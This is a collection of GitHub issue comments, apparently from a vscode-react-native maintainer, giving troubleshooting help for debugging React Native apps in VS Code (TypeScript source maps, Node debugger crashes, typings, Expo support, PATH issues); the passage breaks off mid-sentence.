as an example - this will work w/ react-native@0.42 but has some issues w/ 0.43 due to changes in public transformer's interface (https://github.com/mhzed/react-native-sm-transformer/issues/2)\n@alloy, yeah, I completely agree. @saeedtabrizi, there is no changes required for TS configuration. For the sample project you can refer to https://github.com/panarasi/ReactNativeTS/pull/1 or checkout this repo directly: https://github.com/vladimir-kotikov/ReactNativeTS. @lukecwilliams responded here. @iShawnWang sorry for late response - if this is still actual, could you please provide a bit more info. Would be ideal if you create a new issue and provide all details asked in issue template. Ok, we did some profiling of the code that gets executed each time when app reloads and compared it with reload cycle in when debugging in Chrome. The timings are ~500 ms/reload for Chrome (this is very approximate number as we weren't able to profile this process) and ~2500 ms/reload when debugging using the extension. The measurements were done using empty app, created with react-native init and latest RN version (0.47.1)\nBelow is a typical picture of what's happening at that time:\n\nThe two intervals where debug adapter spends most of the time are:\n1. ~2100-2600 ms - most of this time debug adapter does basically nothing\n2. ~3600-4600 ms - at this interval debug adapter is 100% busy processing bundle's sourcemap\nThe first ~500 ms pause is caused by chrome-debug-core library trying to connect to debuggee process. It looks like the architecture of node inspector protocol requires several attempts for debugger to figure out proper WebSocket connection params before connecting to debuggee and this causes this delay.\nAs for the second interval - this delay is caused by source-map module internals parsing  source map for react-native bundle. Parsing operation itself syncronous and consists of simple math and arrays sorting which makes it impossible to do this work asyncronously.\nAs a result we spend additional ~1.5 seconds on every reload compared to debugging in Chrome and probably won't be able to fix this problem either on our side or in chrome-debug core . @panarasi, thoughts?\nAlso /cc'ing @roblourens as most of these time gaps are caused by underlying chrome-debug-core code and he might have other ideas about what's happening there. @roblourens thanks for the input! That's quite understandable that parsing large SM's (~4Mb in our case) takes time.\nIt also would be great if you can comment on delays when chrome-debug-core attaches to node process, is that expected behavior?. It could be an infrastructure or network issue. I doubt this could be caused by extension itself. @MSLaguana, what do you think?\n. @vonweb, what version of NodeJS are you running on? Also could you provide a sample app where the problem can be reproduced?\n. Thanks for details. At first look it sounds like #273, but with some differences:\n- hitting 'pause' in debugger panel does not have any effect in Node 6.x - app's UI remains frozen but VSCode doesn't stop at the breakpoint\n- in Node 7.x when app \"stops\" at the breakpoint, error message is logged to debug console:\n```\n  #\n  # Fatal error in runtime\\runtime-debug.cc, line 1423\n  # Check failed: args[0]->IsJSObject().\n  #\n==== C stack trace ===============================\nv8::Testing::DeoptimizeAll [0x00007FF7919FD346+1835286]\n  v8::Testing::DeoptimizeAll [0x00007FF791BA9EFD+3591373]\n  (No symbol) [0x00000346FD5063AB]\n```\nThis sounds like another bug with Node, so we'd need to report this to NodeJS team\n. Upd.: On Node 7.x breakpoint event is successfully reported by Node, but right after that one of debug adapter requests (variables, stack, etc.) causes node to crash. Not sure yet, whether this is still an issue with Node or vscode-node-debug extension is to blame.\nAs a workaround you can switch to Node 4.x, which seems to work fine\n. Yeah, you probably right\nThe debugger crash on Node 7.x is also being tracked here\n. This issue has been fixed by switching to node2 debugging engine in #390. @MSLaguana, can we close this?. This might be helpful for us to know NodeJS version (especially for debugging issues) without need to additionally ask users about this. @MSLaguana, what do you think?\n. @nschurmann, is this still an issue for you? I just verified this with latest extension and react-native 0.39 and 0.42 versions and console logging seems to work just fine. I'm going to close this, but feel free to reopen if this is still a problem.. I've sent a PR to react-native, @MSLaguana, please take a look\n. Just verified, that debugging app with RN@0.37 in 0.2.3 works perfectly\n. @MSLaguana, can we close this?. Closing this one as we're not maintaining own RN typings anymore and requests like this are more approriate to be filled against DT repo: https://github.com/DefinitelyTyped/DefinitelyTyped/issues. It looks like the babel from react-native packager somehow ignores sourceMaps option in .babelrc. In both cases, when running app from VSCode and when attaching to the packager, I can see the following error in debug console:\n[vscode-react-native] [Warning] Couldn't import script at <http://localhost:8081/index.android.bundle?platform=android&dev=true&hot=false&minify=false>. Debugging won't work: Try reloading the JS from inside the app, or Reconnect the VS Code debugger: Cannot GET /json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImQ6XFxQUk9KRUNUU1xcVGVtcFxcaWduaXRlX3Byb2plY3RfZmFpbHNfdG9fZGVidWdcXG5vZGVfbW9kdWxlc1xccmVhY3QtbmF0aXZlXFxwYWNrYWdlclxccmVhY3QtcGFja2FnZXJcXHNyY1xcUmVzb2x2ZXJcXHBvbHlmaWxsc1xccHJlbHVkZV9kZXYuanMiXSwibmFtZXMiOlsiZ2xvYmFsIiwiX19ERVZfXyIsIl9fQlVORExFX1NUQVJUX1RJTUVfXyIsIkRhdGUiLCJub3ciXSwibWFwcGluZ3MiOiI7QUFDQUEsT0FBT0MsT0FBUCxDQUFpQixJQUFqQjs7QUFFQUQsT0FBT0UscUJBQVAsQ0FBK0JDLEtBQUtDLEdBQUwsRUFBL0IiLCJmaWxlIjoicHJlbHVkZV9kZXYuanMiLCJzb3VyY2VzQ29udGVudCI6WyIvKiBlc2xpbnQgc3RyaWN0OjAgKi9cbmdsb2JhbC5fX0RFVl9fID0gdHJ1ZTtcblxuZ2xvYmFsLl9fQlVORExFX1NUQVJUX1RJTUVfXyA9IERhdGUubm93KCk7XG4iXX0=\nThis happens because the source maps are embedded into bundle (despite of sourceMaps value) as data URLs, and hence some internal logic in extension is failing to parse these URLs.\n@Kimmen, could you please check index.android.bundle in .vscode/.react folder to see what are sourcemap URLs look like in your case?. @Kimmen, ping. Can you check what sourcemap URLs look like in your case?. @wafisher, could you please check the following:\n1. Does your index.android|ios.bundle have a reference to source map? Are there multiple references?\n2. Does sources section in  corresponding index.ios|android.bundle contain a references to your source files?\n3. Are these references valid? (i.e. the paths are correct and if resolved relative to .vscode/.react directory, ponting to the real files). @ericvera, since version 0.2.4 these URLs are ignored - only the URL that points to map file is respected. Is there a //# sourceMappingURL=index.ios.map entry in your bundle? \nAlso, what are the symptoms of the problem - are the breakpoints not get verified (i.e. stay greyed out after starting debug session) or they are not being hit?. @ericvera, anhy updates? Are you still experiencing the issue with breakpoints?. Guys, I'm going to close this since all my attempts to reproduce this problems didn't succeed. If anybody still experience the problem, feel free to reopen this. @MSLaguana, perhaps we can make installation of typings an opt-in feature? We can show a prompt asking user whether he wants to install typings or not and introduce an option to disable this feature for current project.\n. > does VSCode not automatically download typings?\nI think they have a plans to enable this in future versions, but in VSCode 1.7.1 this feature is disabled\ntypings folder is not a strict requirement for intellisense - we can add this file to any folder inside of the project, but this still would lead to conflicts between typings we add and used-installed ones, at least in typescript-based projects. I can see a few options, how we can avoid these conflicts:\n\nadd a workspace setting so user can opt-in/opt-out\nbe more interactive when setting up a workspace and ask user whether he/she wants us to install typings or prefer to configure them manually - this is how C# extension behaves in .net projects\n\n\n\ndetect presense of tsconfig/jsconfig.json and if it's there - assume that the workspace/typings already configured. @bijeebuss, does this reproduce for you consistently? Could you please provide an exact repro steps or share a minimal app where this problem reproduces? Do you see any errors/warnings in debug console or packager/device output?\n\nI've just tried to reproduce the issue without any luck. I took ReactNativeTS, updated rect-native and react dependencies to latest versions and compiled it. The debugging in generated project works just fine - debugger stops on breakpoints in both index.ios.js and imported component:\n\n. It doesn't change the debugging behavior, just makes ScriptImporter more smart when it tries to find a source map URL to download from packager. All inline source map URLs (like //# sourceMappingURL = data:application/json...) will be ignored since they can't be fetched from packager. If there is no valid URLs, the debugging will continue but breakpoints won't be hit, since source maps weren't downloaded.. @MSLaguana, I added a couple of new tests to demonstrate how this would work. Linking other relevant issues: https://github.com/Microsoft/vscode/issues/12749, https://github.com/Microsoft/vscode-node-debug/issues/112, https://github.com/Microsoft/vscode-react-native/issues/334#issuecomment-259635267. This issue has been fixed by switching to node2 debugging engine in #390. @MSLaguana, can we close this?. @pocesar, this sounds like a dupe of #348 and should be resolved by #357 in newer versions of extension. @pocesar, I think you'll need to wait until new version of extension is published.. Tested w/ latest master and realm and it seems to work correctly after updating vscode detection logic as suggested in https://github.com/realm/realm-js/pull/855#issuecomment-288920254. Closing this.. Odd, -v works for me in clean project, created w/ 0.40: \n~/sandbox/bar react-native -v\nreact-native-cli: 1.2.0\nreact-native: 0.40.0\nand\n~/sandbox/bar react-native -v\nreact-native-cli: 2.0.1\nreact-native: 0.40.0. @prijindal are you on Windows? What shell are you using? It's possible (actually people have been running into this many times) that the path to react-native executable is being added to global PATH variable at shell startup and hence available only inside of shell. When running VSCode from  Start menu (or Dock on Mac) it just not able to find react-native executable and hence fails to activate  . This issue has been fixed by switching to node2 debugging engine in #390. @MSLaguana, can we close this?. @bgiavotto, this souds like a dupe of https://github.com/Microsoft/vscode-react-native/issues/273 and appears to be a node@6.x issue. This issue has been fixed by switching to node2 debugging engine in #390. @MSLaguana, can we close this?. @mikepaggi, debugging react-native apps written in typescript doesn't work out of the box and ususally requires some additional steps to get it working. In short the steps are:\n\nmake sure you're compiling tsx -> js using jsx: 'react' in tsconfig.json (looks like you're already using that option) and having source maps for compiled js files\nprovide a special transformer to react-native packager, that will reuse existing tsx -> js maps when generating the map for final bundle - this basically means that you'll need to start packager manually with --transformer option as explained here (see \"Enabling Sourcemaps\" section)\n\nAlso, since debugging ts is heavily depends on project's configuration, It'd be really great if you could provide a project configuration (tsconfig.json, locations of source files) or a sample minimal app, where the problem exists\nAlso linking #328 as it might be relevant. > have you made sure to specify a custom transformer\nUpd.: the transformer needs to be installed from github repo (npm i --save mhzed/react-native-sm-transformer) rather than from NPM - the version on NPM is outdated and doesn't contain a patch, we've sent to make it working with this extension. > was there anything else to do but install it?\nYep, you'll need to follow the other instructions from reactnative-ts tutorial, in particular to get transformer do its job you'll need to run standalone react-native packager with --transformer argument (as mentioned in the tutorial) - this might be automated using prelaunchTask in launch.json\nAfter running the packager you'll need to use \"Attach to packager\" launch configuration (rather than \"Debug iOS\"/\"Debug Android\") to start debug session.\nThat's basically all. After these steps breakpoints should work in ts/tsx files.\n\nhow do i know if it's running?\n\nThat's tricky, but as a quick check, you can try to search ts/tsx filenames (including extension) in downloaded source map (e.g. at .vscode/.react/index.ios.map) - if transformer is running correctly, there should be entries, pointing to your original typescript files. @mikepaggi, sorry, I was unclear. Yes, exactly, you need to start react-native packager in a separate console session with --transformer option.. @mikepaggi, I agree with you. Ideally i'd like to have packager arguments configurable via some parameter in launch.json but technically it might be tricky to implement as we try to reuse already running packager instance and it's not possible to determine which arguments it has been started with.. As mentioned this is a feature we don't provide - there are a few extensions that provide intellisense for ES5 imports (Path intellisense - also have a \"Mappings\" that sounds very similar to what you suggested, NPM intellisense) , so this request is better to be addressed to them. Closing this. Great! I'm glad that you found the solution.. @panarasi I think we just need to document that the extension uses .react directory inside .vscode to store intermediate files during debugging and users need to add .vscode/.react pattern to their .gitignore\n\nNotice that we also create jsconfig.json automatically which needs to be added to source control. @panarasi please take a look at #505. @RobIsHere thanks for the king words :)\nI think it still might make sense to add .vscode/.react to gitignore just to be sure, but generally it should never appear as changed unless you not going to git commit something during debug session :) . Linking other issues, relevant to node debugger engine (will be fixed after migrating to node2/chrome debugger): #334, #356, #367, #368 . @MSLaguana, can we close this due to #390 has been merged?. @y2kbug, thanks for reporting!\nI confirm that the problem appeared again and it seems to be happening because the fix, mentioned in #306, hadn't been sent to DefinitelyTyped, which is the main source of typings for react-native now. I'll send the update to DT shortly.. Created https://github.com/DefinitelyTyped/DefinitelyTyped/pull/13988. This bug will be resolved once the PR is accepted and updated typings are released on NPM.. Yeah, the simpliest workaround would be to npm install @types/react-native --save-dev and then open  node_modules/@types/react-native/index.d.ts file and add the change from the PR manually. I just verified and it works. Here are the exact instructions:\n1. run npm i --save-dev @types/react-native in your project's root\n2. open <project>/node_modules/@types/react-native/index.d.ts\n3. add the following snippet\n  ```typescript\n        interface Styles {\n            [style: string]: Style\n        }\n    export function create(styles: Styles): any;\n\n``\nright after the line withexport namespace StyleSheet {` (it's line 4469 in my case).\nYou might also need to restart VSCode after applying the changes, but in my case they were applied immediately.. @y2kbug, this is not yet supported unfortunately - react typings are still incomplete. There is a separate issue for this - #387. Linking another PR that would fix the problem with autocompleting StyleSheet properties https://github.com/DefinitelyTyped/DefinitelyTyped/pull/14906. Closing this one as a) it has been resolved in DefinitelyTypes and should be available in new RN typings b) we're not maintaining own RN typings anymore and requests like this are more approriate to be filled against DT repo. @piyushchauhan2011, as I mentioned in https://github.com/Microsoft/vscode-react-native/issues/379#issuecomment-317391772 we're not maintaining our own typings for React Native anymore and don't install them into project (if only you're not using relatively old version of VS Code). Instead we rely on TypeScript's ATA (automatic typings acquisition) feature which fetches latest typings for dependencies from @types and this is the process we can't affect.\nOne idea that I have about why it doesn't work in your case - Typescript's ATA cache might got a bit stale so you could try either remove existing RN typings from cache () or just npm i @types/react-native to install the latest typings into your project and enforce TS to use them.\nSee also https://github.com/Microsoft/TypeScript/issues/16912 for reference. @ggomersall, react-native extension doesn't performa any automatic code formatting - try to look for JS-CSS-HTML Formatter (or perhaps any other code formatting extension) in the list of installed extensions, as @y2kbug mentioned, and disable it to see if that solve the problem. Looks like it was possible in the past to specify \"variant\" in launch configuration, but it's undocumented and, in fact, is not working at all. I'll send a PR to fix this.. @pcguru, I'm just curious about how are you specifying different app IDs for different build variants. Are you using applicationIdSuffix for that? I'm asking because react-native doesn't seem to resolve application id properly and tries to launch app using wrong id\nStarting the app on 192.168.56.101:5555 (/Users/kotikov.vladimir/Library/Android/sdk/platform-tools/adb -s 192.168.56.101:5555 shell am start -n com.androidmultiplevariants/.MainActivity)...\nwhereas it should be com.androidmultiplevariants.staging/.MainActivity. @pcguru, I made a PR for that (#385). However we're still relying on react-native for running app on device, so in case if build variant adds a suffix to application Id, we won't be able to run app as well. A workaround here is to run app manually and then use \"Attach to packager\" launch configuration.. @matrosov-nikita, could you please take a look?. @MSLaguana, can we close this due to #388 has been merged?. Closing this one as we're not maintaining own RN typings anymore and requests like this are more approriate to be filled against DT repo: DefinitelyTyped/DefinitelyTyped/issues. @nonameolsson this definitely did work some time ago. It's possible though that there is a new problem w/ extension and recent RN version (there were a couple in the past, see https://github.com/Microsoft/vscode-react-native/issues/384#issuecomment-275663114). If you're still experiencing the problem, please file a new issue. . Babel ES6/ES7 (aka vscode-babel) also defines Javascript (Babel) as an alias for javascript and shouldn't affect intelisense in any way.. @BrooklynaT, are you still having any issues with intellisense in your project?. Closing this. @BrooklynaT, feel free to reopen if you're still having any issues w/ this. @MSLaguana, @roblourens I would really appreciate any feedback on this. Thanks for review, guys!\n\nAm I correct that the SingleLifetimeAppWorker is no longer used at all, and is replaced by the forking app worker?\n\nThat's correct. I initially thought that we might want to keep them both, just in case if we plan to support old \"node\" debugger, but this doesn't seem to be the case. Am i right? Do you want me to drop that old worker code?. @MSLaguana, addressed your comments and updated tests to actually test current worker implementation. Please take a look once more. @bluntcoder, we can't \"move\" issues. You could just close this one and create the same issue in the repo you want.. @MSLaguana, could you please close this?. Also, shouldn't we add a notice about required Node version? I searched through docs but didn't find any info about Node.js version we require for debugging? . Hey @hjpsievert, thanks for reporting!\nUnfortunately I don't think we can avoid this. As I noted in #394:\n\nI'm still seeing Node's GLOBAL deprecation message, but I doubt we could avoid it because GLOBAL's setter is also configured to emit this warning (see also https://github.com/nodejs/node/blob/master/lib/internal/bootstrap_node.js#L203-L219)\n\nSo this warning will be emitted at least once, when we try to write GLOBAL property\nAs for the change you suggested, I don't think it would help since you are basically proposing to define module local variable named GLOBAL, however the intent was to overwrite 'global' GLOBAL. Moreover in this case, since deprecation warning is not triggered early before react native code is loaded, it will be triggered after then by react - in my case it leads to the red box shown on the screen.. > So does that mean that the newest version of react-native tools on Visual Studio Code is just fine and these are erroneous deprecation warnings that I can ignore or is there a future change that will make them go away.\nYes, that's absolutely fine, though it might be annoying. I guess it will go away once Node will completely remove global.GLOBAL (see also https://github.com/nodejs/node/wiki/Breaking-changes-between-v5-and-v6#globals)\n\nI have also been seeing error messages about promises and timeouts after setting breakpoints that started a few days ago when I updated react-native tools, but breakpoints work just fine.\n\nNo, this is somenting we haven't seen before. Feel free to open a new issue when they appear next time.. @jhalborg those warnings shoud have went away after #401, so this might be a different issue. Does this reproduce on clean Expo project? Mac OS/Windows? Which Node JS version are you running?. @jhalborg Ideally I'd appreciate if you could create a separate issue and file all details in issue template. Thanks in advance.. @MSLaguana, that's very possible but I can't confirm this because neither me nor Nikita wasn't able to reproduce this.\nYet we could try to override setBreakpoints method in our debug adapter to catch these errors and prevent them from logging to debug console (as in #403). What do you think? . Hmm, no, this is another one. I suspect it might have happened due to some lags on Travis - notice that the second failure was also caused by exceeding timeout of the test.. Rebased on top of master and force-pushed to trigger CI. Thank you for reporting, @galvesribeiro!\nThe thing with combination of React Native and Typescript is that it requires some additional configuration work to be done before debugging will work. \"ReactNativeTS\" repository from aforementioned article is a good starter point, but it's a bit outdated and still has some configuration issues, specifically with mapping breakpoints from typescript sources to compiled code.\nI believe that most of your issues is due to that, so I have crafted an updated version of the app that includes some tweaks and has support for typescript debugging out of the box (you could just clone it, do npm i, open in VSCode and debug):\nHere is the list of what has been updated:\n\nRN dependency upgraded to 0.41.2 (latest)\nTypescript upgraded to 2.1.x\n@types/react-native is used instead of typings\nUpdated tsconfig and babelrc to handle source maps correctly\nAdded build task and made it running before starting debugging\n\nCould you please try it out and let me know if it works for you.\n. (Updated) @galvesribeiro, that's odd. Is react-native properly installed? What happens when you run react-native -v in the cloned directory? Also, when you open the project can you see .react directory created inside of .vscode?. @galvesribeiro, what about .react directory inside of .vscode? Can you see it?\nCould you please also try adding the following lines to workspace settings:\n{\n  \"react-native-tools\": {\n    \"showInternalLogs\": true,\n    \"logLevel\": \"Trace\"\n  }\n}\nand then restart vscode and check \"React-Native\" output channel?. Hmm... I don't know yet why this red box might appear, so I would appreciate if you add more details when you see it next time. As for other your points:\n\nGLOBAL deprecation warning is a known issue and it shouldn't affect debugging in any way. There is also a PR (#401) that fixes this warning.\n\nlive reload most likely doesn't work because the default setup doesn't have a watch task, so the TS isn't being recompiled after changes. You could add a watch task similar to build (see .vscode/tasks.json and \"scripts\" section in package.json for examples) and either use it instead of build as pre-launch task or run it separately after you have launched app on device. . Ok, here is what worked for me:\n\n\nAdd \"watch\": \"tsc -p . --watch\"  to scripts section in package.json\n\n\nAdd the following task to .vscode/tasks.json:\n{\n    \"isBackground\": true,\n    \"taskName\": \"watch\",\n    \"problemMatcher\": \"$tsc-watch\"\n}\n\n\n\nUpdate launch.json to run watch task instead of build\n\n\nAfter changing any source you should see a spinner (right before \"React Native Packager: started\") that disappears shortly after that which indicates that watch task has compiled your change. Right after that if you open \"React-native\" output channel, you should see something like\nBundling `index.ios.js`\n  Updating 1 module in place, done. I also added these changes to the example so you can just check out the new version at vladimir-kotikov/reactnativets. @galvesribeiro, i can see that HMR doesn't work when you changing the onPress handler's code, however it does work for changes e.g. inside of render (e.g. JSX template). I believe this is due to template implementation, specifically because onPress is defined as a class' field rather than prototype's property.\n@panarasi, yeah, will do. As for sm-transformer removal, our users discovered another approach that makes babel to take ts->js mappings into account and include them into final bundle map (see https://github.com/Microsoft/vscode-react-native/issues/328#issuecomment-275660678 for details). Though this approach is not documented, I think that it's easier to follow and doesn't require running separate packager instance which allows us to nicely integrate it into VSCode debugging experience.. @galvesribeiro, check out this: https://github.com/panarasi/ReactNativeTS/pull/1/commits/a6c82de48e97a84c14d16e1d173d6ca4b39d4e70 - it should help you enable HMR in onPress. @EamonnLaffey, thanks for letting us know. I would appreciate if you could file a separate issue and maybe attach a sample project so we can take a look at your TS configuration. Thanks.. @lukecwilliams responded here. Closing this issue as the things around typescript debugging have changed a lot.\nNamely, react-native packager doesn't respect inlined sourcemaps in source files anymore, react-native-sm-transformer also doesn't seem to be working with react-native >=0.43. To solve this problem we introduced own sourcemap processing that will merge any existing sourcemaps in js files into bundle, so breakpoints are now working out-of-the box with typescript (see #461). @matrosov-nikita, could you please rebase the PR. @ferologics, it's not very clear, what your project structure look like.\nIs the issue is just about having ios project in directory other than 'ios'? If so, you could specify path to your ios project folder via  iosRelativeProjectPath property in launch configuration (see https://github.com/Microsoft/vscode-react-native/blob/master/package.json#L226-L230).\nAs for absence of launchReactNative.js file - this entry is just a dummy to satisfy debugging protocol - technically we wouldn't need this property at all, but VSCode requires program property to be defined in all debug configurations.. @ferologics, any updates?. @ferologics, what about the result of react-native run-ios command? I bet that it's failing a well, since the extension uses exactly the same command as react-native does. Unfortunately we can't support all possible project configurations, so you'd need to update you project to be buildable from command line first.. Okay, I'm closing this. @ferologics, feel free to reopen if this still an issue for you.. @yahue, there are a couple of threads, where you can find more info about configuring typescript & react-native to be able to debug it in vscode, see #328 and #402. As for your particular case, you just need to add these lines to tsconfig.json:\n\"sourceRoot\": \"src\",\n\"inlineSourceMap\": true,\nto generate inline tsx -> js maps, so react packager would consider them when generating map for bundle (you can find more about this behavior here). Closing this. @yahue, feel free to reopen in case if you're still experiencing any issues w/ debugging typescript. @mongris, thanks for reporting. This is indeed a regression, caused by using module's scope instead of global's one for holding Node's require functionality available. This should be fixed once #401 is merged.. @cem2ran, thanks for reporting. Unfortunately, exponent support currently seems to be broken (see #414). We're investigating these issues and will let you know if there are any updates. This should be fixed in #415. Specifically there are two problems - a) we're using pretty outdated version of xdl and b) we're not passing options from exp.json to packager.. @Gumija, thanks for reporting. Just to be sure - have you enabled JS debuggint in the app by hitting \"Debug JS Remotely\" in developer menu on device?\nAlso, just to clarify, are you trying to debug a standard react-native project or the project created with Exponent? Looking at the developer console output I see that extension is trying to install xdl package which means that it has detected that this is an exponent project and is trying to preconfigure it.. @Gumija, I'm sorry but I'm afraid that I don't completely understand what exactly is your problem (now after issues with exp went away, though they were IMO very suspicious). \nWhat happens after you press 'Debug' in VSCode? If everything works fine It should log some strings to debug console and then start waiting for application to connect to packager. There also should be a progress indicator right below 'Start Debugging button'\n\nAfter you press 'Start JS debugging' (or reload the app if it already has been put into JS debugging mode) the debugger should connect to app and actually start debug session - the progress indicator should disappear and the status bar should change the color. Also there should appear a message in debug console that indicates that debugger discovered a process to attach to - something like [vscode-react-native] Debugger worker loaded runtime on port 25712\nIf this is not what you are seeing, please explain what exactly happens for you when you start debug session and  enable 'Debug JS remotely' on device. In that case please also try adding the following lines to VSCode workspace configuration (see https://github.com/Microsoft/vscode-react-native#customization):\njson\n{\n  \"react-native-tools\": {\n    \"showInternalLogs\": true,\n    \"logLevel\": \"Trace\"\n  }\n}\nand paste here the output of debug console again - this might give us some insights about what is happening.. @Gumija, thanks for response. It sounds like the node process, that executes react native code somehow stucks when loads the bundle, so the debugger can't attach. I'm currently out of ideas how to diagnose this further, but it's possible that upgrading node would help - vscode-node-debug2 that is used by this extension states that there might be issues w/ Node < 6.9, especially on Windows.\nUpd.: If this won't help, you might try adding another couple of lines to \"Debug Android\" section in launch.json: \n\"diagnosticLogging\": true,\n\"verboseDiagnosticLogging\": true\nand paste output here (or upload somewhere else) - this will give us a bit more information about what's happening when debugger tries to attach to the process...\n. Cool! Thanks for update. @jpokrzyk, I think this is expected behavior. IMO this was done to reduce time requred to restart or launch another debug session. @MSLaguana might know more about this.\nAs for stopping packager, I think that quitting VSCode is not necessary for this - you can use React Native: Stop packager command, available in command pallete - just press F1 and start typing stoppa... to find it.. @ilhamahp can you explain your use case? Why would you want to stop packager every time when debugging stops?\nI think that the idea of react-native packager is to run it once and then keep it running all the time since it has live-reload capabilities and can handle changed sources and rebuild bundle on-the-fly, so restarting it every time is just redundant.. @ilhamahp, that makes sense.\nIn your case it would be reasonable to have packagers for different projects bound to different ports so they are not interfere with each other. Though this is not yet supported (at least in latest released version) we've done some improvements to support this use case\n/cc @iTOYS . @pvinis, it looks like the issue in your case is that we couldn't spawn react-native command - the error in DevTools console is self-explanatory: reason:  Error: spawn react-native ENOENT.\nIs react-native-cli package is installed globally in your system? What happens when you run react-native --version inside of your project folder?. Hmm.. I suspect this might have something to do with PATH configuration. Could you please execute and post here\n1. output of which react-native in terminal\n2. output of process.env.PATH in VSCode dev tools. Is that possible that you have removed node 7.6.0 and installed 7.7.1 while VSCode window was opened? This would explain why system PATH has changed and doesn't match one which VSCode has been launched with. To fix this I guess you could just restart VSCode so it'd pick up new environment.. @rendomnet I believe that the difference is that when you run it from console it inherits all environment variables from that console session and you probaby have your $PATH extended somewhere in .bashrc or .bash_profile to include global node's executable directory (in my case it's ~/.nvm/versions/node/v8.2.1/bin). @rendomnet I can't imagine any easy way. Though you might want to try to modify global path (https://serverfault.com/questions/16355/how-to-set-global-path-on-os-x) but that's IMO is just an overkill. @JonnyLinja, thanks for reporting. Unfortunately I wasn't able to repro this using simple RN app, so this might depend on your project configuration. To check if this is configuration related issue, could you please try creating an empty react-native project and try debugging it? Also, for further investigation could you please add the following two lines to your \"Debug Android\" configuration in launch.json:\njson\n\"diagnosticLogging\": true,\n\"verboseDiagnosticLogging\": true\n, run debug session and paste debug console content here (or upload somewhere, as it most probably will be pretty long)\nAs for missing launchReactNative.js - that's ok. Due to some VSCode debug protocol limitations, launch configuration must contain \"program\" property, but react-native debugger doesn't use it anyway.. @JonnyLinja, thanks for details. Unfortunately in your case the debugger doesn't even try to connect to your app. Does the app start successfully and has JS debugging enabled in developer menu? Also, could you please check .vscode/.react directory after starting debug session to see if there is a debuggerWorker.js file is present? . @JonnyLinja, is this is still actual? Are you still experiencing the problem?. @panarasi yes. Unfortunately it was a long time ago and it wasn't clear if this is a bug in extension on some misconfiguration so @JonnyLinja, could you please confirm if you're still seeing this?. Okay, closing this as outdated. @JonnyLinja feel free to reopen if it still reproes.. @matrosov-nikita, could you please rebase the PR. @matrosov-nikita, could you take a look please?. @nathanpiper, thanks for sending a PR! Could you please rebase this PR to resolve conflicts are trigger CI?. Thanks, @nathanpiper! . Hey @ciceroneves, sorry for late response. It looks like that all you need is to specify variant option in your launch.json - it would have exactly the same effect as supplying --variant parameter to react-native command. It's not yet mentioned in README unfortunately, but VSCode autocompletion for 'launch.json' will suggest you that the option exists. See also https://github.com/Microsoft/vscode-react-native/blob/master/package.json#L231-L234 for description.\nPlease let me know if it doesn't work for you.. Closing this. @ciceroneves, feel free to reopen if solution w/ variant option in launch.json doesn't work for you.. @quincycs, thanks for suggestion! Just to clarify - do you propose to add an ability to bootstrap new RN project from VS Code using CRNA or just to support debugging and other features for CRNA-created projects?. Closing this as debugging CRNA and Expo apps is supported using both RN and Expo packagers. There is also a new version that fixes multiple small issues w/ Expo/CRNA debugging.. @matrosov-nikita, as discussed yesterday, this is likely needs to be closed.. Implemented in #430 . @G2Jose, thanks!. @axemclion, just looked at this and it seems that CRNA-made projects works just fine with exp which probably means that we could get rid of this step for apps that were created using CRNA. I think we can detect this by looking for app.json w/ expo section at the root of the project.\nThe only thing that confuses me in this case is that exp prints a warning about version of react native\n\nWarning: Not using the Expo fork of react-native. See https://docs.expo.io/.\n\nand I'm not sure yet how much this warning is severe.\nHowever, it seems that latest Expo (in particular I was using exp) is still requires (maybe this is not a strong requirement though) its own version of react-native: \njson\n  \"dependencies\": {\n    \"@expo/ex-navigation\": \"~2.9.2\",\n    \"@expo/samples\": \"~1.0.3\",\n    \"expo\": \"^15.0.2\",\n    \"react\": \"~15.4.0\",\n    \"react-native\": \"https://github.com/exponent/react-native/archive/sdk-15.0.0.tar.gz\"\n  },\n. @dikaiosune Cool! Thanks for clarification! Hope you wouldn't mind if I bother you in Slack if I have additional questions.\n@panarasi, given what Adam says that should be pretty easy to get rid of that step - I'm going to prototype and test \"debugging in Expo\" scenario more thoroughly w/ both Expo and CRNA apps to see whether it's safe. Also I think there is currently some issues that actually break debugging scenario for CRNA apps but that's another issue - I'll investigate and file a separate ticket.. Yeah, we have alredy tagged version 0.3.2 to be released that should fix all known problems w/ Expo support. \n@axemclion, could you please help w/ publishing it? . @panarasi, sure. Here it is: https://github.com/Microsoft/vscode-react-native/milestone/8?closed=1 and here is the release page: https://github.com/Microsoft/vscode-react-native/releases/tag/0.3.2. @panarasi, @axemclion I think we still need to keep it open, because the initial issue (redundant react-native reinstallation) hasn't been resolved yet. Redownloading Expo's react-native dependency has been fixed in 0.4.0, so closing this.\n@gauti1996, please open a new issue if you're still experiencing problems w/ deploying on device - we'll try to help.\n@GollyJer, sorry for late response - debugging should work on Windows 10, but there were some minor general issues that might break debugging scenarios. Please try out new version of extension and if there are still any issues with debugging - please file a new ticket. Reviewed and tested. LGTM. /cc @axemclion. Sorry for the late response, @jpshelley. I can observe the behaviour you described - the following error\n```\n### Packager started.\nLoading dependency graph, done.\nBundling index.ios.js  [development, non-minified, hmr disabled]  0.0% (0/1), failed.\nerror: bundling failed: \"Cannot find entry file index.ios.js in any of the roots: [\\\"/Users/kotikov.vladimir/sandbox/foo\\\"]\"\nStarting custom debugger by executing: echo A debugger is not needed:  \"/Users/kotikov.vladimir/sandbox/foo\"\n```\nis logged by packager to output channel (the message is a bit different but that's because I have another react-native version installed), however after starting the app is able to fetch proper bundle file and breakpoints in renamed entry files are also working.\nWhat's happening there is that when you start debugging we try to \"prewarm\" packager by triggering bundle generation ahead of time, just to make next bundle requests perform faster - for this process we just use index.${platform}.jsas bundle name assuming that entry points for both android and iOS have standard names.\nHowever when debugger attaches to app, the app sends to us proper bundle path/name which we then use for debugging.\nThat said I don't think that this problem is critical and if you have some serious troubles with debugging then I'd say this is a different issue.\n. In theory we might have an option to specify entry file path for each platform but since this only affects packager \"prewarming\" and not causing problems with debugging experience I'd say this is a low-priority feature. @panarasi thoughts?. Closing as this doesn't sound like a problem with extension. @sergul, I apologise for late response. Could you please let me know if the issue still actual?. Closing this. @sergul feel free to reopen if you run into this again. This is a duplicate of #328, please take a look at the conversation there to find a suitable workaround. @seyaobey thanks for reporting and sorry for silence. We're aware of the promlem and working on the fix.. @mindrage absolutely, but AFAIK it won't require any specific configuration. I'll update the thread w/ actual information ance it's ready. @lukecwilliams responding here as this is the most recent issue with typescript sourcemaps - there is a workaround, that doesn't rely on RN sourcemaps pipeline and additional transformers - see #461. It'll be available once we get new version of 